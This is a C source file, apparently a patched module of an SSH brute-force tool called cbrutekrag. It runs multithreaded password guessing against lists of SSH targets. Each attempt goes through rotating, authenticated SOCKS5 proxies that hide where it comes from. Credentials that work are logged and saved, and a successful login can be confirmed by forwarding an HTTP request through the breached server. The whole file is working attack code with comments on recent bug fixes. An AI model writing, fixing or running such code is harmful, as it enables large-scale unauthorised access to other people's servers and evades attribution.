/*
 * Fixed bruteforce_proxy_ssh.c
 * - Uses heap allocation for thread array (Fixes Stack Overflow)
 * - Fixes race condition on file descriptors (Double Close fix)
 * - Supports SOCKS5 Username/Password Authentication
 */

#define _POSIX_C_SOURCE 200809L
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#include <libssh/libssh.h>
#include <pthread.h>

#include "cbrutekrag.h"
#include "log.h"
#include "proxy.h"
#include "bruteforce_proxy_ssh.h" /* Make sure to include the updated header */

/* Attempt to brute-force SSH login using proxy */
int bruteforce_ssh_login_proxy(btkg_context_t *context, const char *hostname,
                               uint16_t port, const char *username,
                               const char *password,
                               const char *proxy_ip, uint16_t proxy_port,
                               const char *proxy_user, const char *proxy_pass)
{
    ssh_session session = NULL;
    int verbosity = 0;
    btkg_options_t *options = &context->options;

    if (options->verbose & CBRUTEKRAG_VERBOSE_SSHLIB) {
        verbosity = SSH_LOG_PROTOCOL;
    } else {
        verbosity = SSH_LOG_NOLOG;
    }

    session = ssh_new();
    if (session == NULL) {
        log_error("Cant create SSH session.");
        return -1;
    }

    if (!proxy_ip || proxy_ip[0] == '\0' || proxy_port == 0) {
        log_error("Invalid proxy provided to bruteforce_ssh_login_proxy.");
        ssh_free(session);
        return -1;
    }

    int proxied_fd = -1;
    
    /* 
     * Connect via SOCKS5 Proxy 
     * Uses the new signature with proxy_user/proxy_pass 
     */
    if (btkg_proxy_socks5_connect(context, proxy_ip, proxy_port,
                                  proxy_user, proxy_pass,
                                  hostname, port, &proxied_fd) != 0) {
        /* Connection failed. 
           If btkg_proxy_socks5_connect opened a socket but failed handshake, 
           it should have closed it. If it returns < 0, we assume FD is invalid or closed. 
           But to be safe, if we have a valid FD, close it here. */
        if (proxied_fd >= 0) close(proxied_fd);
        
        /* Note: We log only at debug level to avoid spamming 1000s of errors */
        log_debug("Failed to connect to %s:%u via proxy %s:%u",
                  hostname, (unsigned)port, proxy_ip, (unsigned)proxy_port);
        
        ssh_free(session);
        return -1;
    }

    int timeout = options->timeout;
    ssh_options_set(session, SSH_OPTIONS_HOST, hostname);
    ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(session, SSH_OPTIONS_PORT, &(int){ port });
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    
    /* 
     * CRITICAL FIX: Pass FD to libssh. 
     * libssh takes OWNERSHIP of this FD. It will close it when ssh_free is called.
     */
    ssh_options_set(session, SSH_OPTIONS_FD, &proxied_fd);
    
    /* Mark locally as -1 so we don't accidentally close it again */
    proxied_fd = -1;

    int r = ssh_connect(session);
    if (r != SSH_OK) {
        if (options->verbose & CBRUTEKRAG_VERBOSE_MODE) {
            log_error("[!] Error connecting to %s:%d %s.", hostname,
                      port, ssh_get_error(session));
        }
        /* ssh_free closes the socket */
        ssh_free(session);
        return -1;
    }

    r = ssh_userauth_none(session, NULL);
    if (r == SSH_AUTH_SUCCESS) {
        log_debug("[!] %s:%d - Server without authentication.", hostname, port);
        ssh_disconnect(session);
        ssh_free(session);
        return -1;
    }

    if (r == SSH_AUTH_ERROR) {
        log_debug("[!] %s:%d - ssh_userauth_none(): A serious error happened.", hostname, port);
        ssh_disconnect(session);
        ssh_free(session);
        return -1;
    }

    int method = ssh_userauth_list(session, NULL);

    if (method & (int)SSH_AUTH_METHOD_PASSWORD) {
        r = ssh_userauth_password(session, NULL, password);
        if (r == SSH_AUTH_SUCCESS) {
            if (options->check_http != NULL) {
                ssh_channel channel = ssh_channel_new(session);
                if (channel == NULL) {
                    log_error("Error ssh_channel_new: %s", ssh_get_error(session));
                    ssh_disconnect(session);
                    ssh_free(session);
                    return -2;
                }

                log_debug("%s:%d %s %s - Opening tunnel (via proxy)...",
                          hostname, port, username, password);
                r = ssh_channel_open_forward(channel, options->check_http, 80,
                                            "localhost", 0);
                if (r != SSH_OK) {
                    log_error("Error ssh_channel_open_forward: %s", ssh_get_error(session));
                    ssh_channel_close(channel);
                    ssh_channel_free(channel);
                    ssh_disconnect(session);
                    ssh_free(session);
                    return -3;
                }

                char buffer[1024];
                int nbytes;
                snprintf(buffer, sizeof(buffer),
                         "GET / HTTP/1.1\r\nHost: %s\r\n\r\n",
                         options->check_http);

                r = ssh_channel_write(channel, buffer, (uint32_t)strlen(buffer));
                if (r == SSH_ERROR) {
                    log_error("Error ssh_channel_write: %s", ssh_get_error(session));
                    ssh_channel_close(channel);
                    ssh_channel_free(channel);
                    ssh_disconnect(session);
                    ssh_free(session);
                    return -4;
                }

                nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
                if (nbytes == 0) {
                    log_warn("%s:%d %s %s - http-check empty response", hostname, port, username, password);
                    ssh_channel_close(channel);
                    ssh_channel_free(channel);
                    ssh_disconnect(session);
                    ssh_free(session);
                    return -6;
                }

                if (nbytes < 0) {
                    log_error("Error ssh_channel_read: %s", ssh_get_error(session));
                    ssh_channel_close(channel);
                    ssh_channel_free(channel);
                    ssh_disconnect(session);
                    ssh_free(session);
                    return -5;
                }

                ssh_channel_close(channel);
                ssh_channel_free(channel);
            }

            ssh_disconnect(session);
            ssh_free(session);
            return 0;
        }
    }

    ssh_disconnect(session);
    ssh_free(session);
    return -1;
}

/* Wrapper for trying login */
int bruteforce_ssh_try_login_proxy(btkg_context_t *context, const char *hostname,
                                   const uint16_t port, const char *username,
                                   const char *password,
                                   const char *proxy_ip, uint16_t proxy_port,
                                   const char *proxy_user, const char *proxy_pass)
{
    const char *_password = strcmp(password, "$TARGET") == 0 ? hostname : password;
    const char *_username = strcmp(username, "$TARGET") == 0 ? hostname : username;

    int ret = bruteforce_ssh_login_proxy(context, hostname, port, _username, _password,
                                         proxy_ip, proxy_port, proxy_user, proxy_pass);

    if (ret == 0) {
        log_info("\033[32m[+]\033[0m %s:%d %s %s", hostname, port, _username, _password);
        if (context->output != NULL) {
            btkg_log_successfull_login(context->output,
                                       context->options.bruteforce_output_format,
                                       hostname, port, _username, _password);
        }
    } else {
        log_debug("\033[38m[-]\033[0m %s:%d %s %s", hostname, port, _username, _password);
    }

    return ret;
}

static void *btkg_bruteforce_worker_proxy(void *ptr)
{
    btkg_context_t *context = (btkg_context_t *)ptr;
    
    btkg_target_list_t *targets = &context->targets;
    btkg_credentials_list_t *credentials = &context->credentials;
    btkg_proxy_list_t *proxies = &context->proxies;
    btkg_options_t *options = &context->options;

    for (;;) {
        pthread_mutex_lock(&context->lock);

        if (context->targets_idx >= targets->length) {
            context->targets_idx = 0;
            context->credentials_idx++;

            if (proxies->count > 0) {
                context->proxies_idx++;
                if (context->proxies_idx >= proxies->count) {
                    context->proxies_idx = 0;
                }
            }
        }

        if (context->credentials_idx >= credentials->length) {
            pthread_mutex_unlock(&context->lock);
            break;
        }

        btkg_target_t *target = &targets->targets[context->targets_idx++];
        btkg_credentials_t *combo = &credentials->credentials[context->credentials_idx];

        const char *proxy_ip = NULL;
        uint16_t proxy_port = 0;
        const char *proxy_user = NULL;
        const char *proxy_pass = NULL;
        
        if (proxies->count > 0) {
            if (context->proxies_idx >= proxies->count) {
                context->proxies_idx = 0;
            }
            btkg_proxy_t *pxy = &proxies->proxies[context->proxies_idx];
            proxy_ip = pxy->ip;
            proxy_port = pxy->port;
            
            /* Extract Auth Info */
            if (pxy->user[0] != '\0') proxy_user = pxy->user;
            if (pxy->pass[0] != '\0') proxy_pass = pxy->pass;
        }

        context->count++;
        pthread_mutex_unlock(&context->lock);

        if (!proxy_ip || proxy_port == 0) {
            if (!options->dry_run) {
                log_debug("No proxy configured; skipping attempt");
                continue;
            }
        }

        if (!options->dry_run) {
            int ret = bruteforce_ssh_try_login_proxy(context,
                    target->host, target->port,
                    combo->username, combo->password,
                    proxy_ip, proxy_port,
                    proxy_user, proxy_pass);
            if (ret == 0) {
                pthread_mutex_lock(&context->lock);
                context->successful++;
                pthread_mutex_unlock(&context->lock);
            }
        } else {
            const char *proxy_str = proxy_ip ? proxy_ip : "no-proxy";
            log_debug("[-] %s:%d %s %s (proxy=%s:%u user=%s)",
                  target->host, target->port, combo->username,
                  combo->password, proxy_str, (unsigned)proxy_port, 
                  proxy_user ? proxy_user : "none");
        }
    }

    return NULL;
}

/* 
 * FIXED: Uses heap allocation for thread array to avoid stack overflow 
 */
void btkg_bruteforce_start_proxy(btkg_context_t *context)
{
    btkg_options_t *options = &context->options;
    
    log_info("Starting proxy bruteforce with %zu threads", options->max_threads);

    /* Allocate thread array on HEAP */
    pthread_t *scan_threads = malloc(options->max_threads * sizeof(pthread_t));
    if (!scan_threads) {
        log_error("Failed to allocate memory for %zu threads", options->max_threads);
        return;
    }

    int ret;
    size_t created = 0;

    for (size_t i = 0; i < options->max_threads; i++) {
        if ((ret = pthread_create(&scan_threads[i], NULL,
                                  btkg_bruteforce_worker_proxy,
                                  (void *)context))) {
            log_error("Thread creation failed at index %zu: %d", i, ret);
            break;
        }
        created++;
    }

    for (size_t i = 0; i < created; i++) {
        ret = pthread_join(scan_threads[i], NULL);
        if (ret != 0) {
            log_error("Cannot join thread %zu: %d", i, ret);
        }
    }

    free(scan_threads);
}
